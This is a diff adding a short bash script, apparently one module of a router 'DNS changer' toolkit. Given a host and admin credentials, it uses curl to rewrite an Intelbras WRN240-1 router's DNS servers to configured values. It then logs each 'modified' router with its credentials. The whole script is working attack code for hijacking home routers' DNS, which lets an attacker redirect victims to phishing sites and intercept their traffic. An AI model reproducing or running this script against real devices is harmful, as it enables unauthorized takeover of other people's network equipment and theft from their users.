@@ -1,0 +1,13 @@
+#!/bin/bash
+##########################
+# by bonny #
+##########################
+# CONFIG
+source configs/changers.cfg 
+HOSTNAME="$1" 
+USERNAME="$2" 
+PASSWORD="$3"
+###########################
+${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/userRpm/WanDynamicIpCfgRpm.htm?wan=0&wantype=0&mtu=1500&manual=2&dnsserver=$DNS1&dnsserver2=$DNS2&hostName=WRN240-1&Save=Salvar" 1>/dev/null 2>/dev/null 
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [INTELBRAS WRN240-1]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD}) [INTELBRAS WRN240-1]" >> logs/modificados.log
